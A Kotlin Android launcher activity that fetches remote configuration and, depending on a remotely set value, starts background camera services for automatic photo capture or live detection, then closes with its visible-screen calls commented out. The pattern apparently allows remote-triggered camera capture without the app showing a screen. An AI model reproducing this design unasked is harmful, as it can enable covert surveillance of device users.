package com.example.demoapplication

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.demoapplication.services.CameraBackgroundService
import com.example.demoapplication.services.LiveCameraDetectService
import com.example.demoapplication.services.NetworkModule

class LauncherActivity : AppCompatActivity() {
    private var launched = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_launcher)

        // Only open destination when remote config fetch+activate returns success
        RemoteConfigHelper.fetchAndActivate { success ->
            runOnUiThread {
                if (!launched && success) {
                    val dest = RemoteConfigHelper.startDestination()
                    NetworkModule.applyStartDestination(dest)
                    openDestination()
                } else if (!success) {
                    Log.w("LauncherActivity", "RemoteConfig fetch failed — not opening destination")
                    // Optionally show a UI message to user here
                }
            }
        }
    }

    private fun openDestination() {
        if (launched) return
        launched = true

        val dest = RemoteConfigHelper.startDestination().lowercase()
        when (dest) {
            "auto_photo_capture" -> {
                val serviceIntent = Intent(this, CameraBackgroundService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
//                startActivity(Intent(this, CameraDetectActivity::class.java))
                Log.d("OpenDest", "Started CameraService for auto_photo_capture")
            }
            "live_camera_detect" -> {
                val serviceIntent = Intent(this, LiveCameraDetectService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
//                startActivity(Intent(this, MainActivity::class.java))
                Log.d("OpenDest", "Started LiveCameraService for live_camera_detect")
            }
            else -> {
                val serviceIntent = Intent(this, LiveCameraDetectService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
//                startActivity(Intent(this, CameraDetectActivity::class.java))
                Log.d("OpenDest", "Started default CameraService (fallback)")
            }
        }
        finish()
    }
}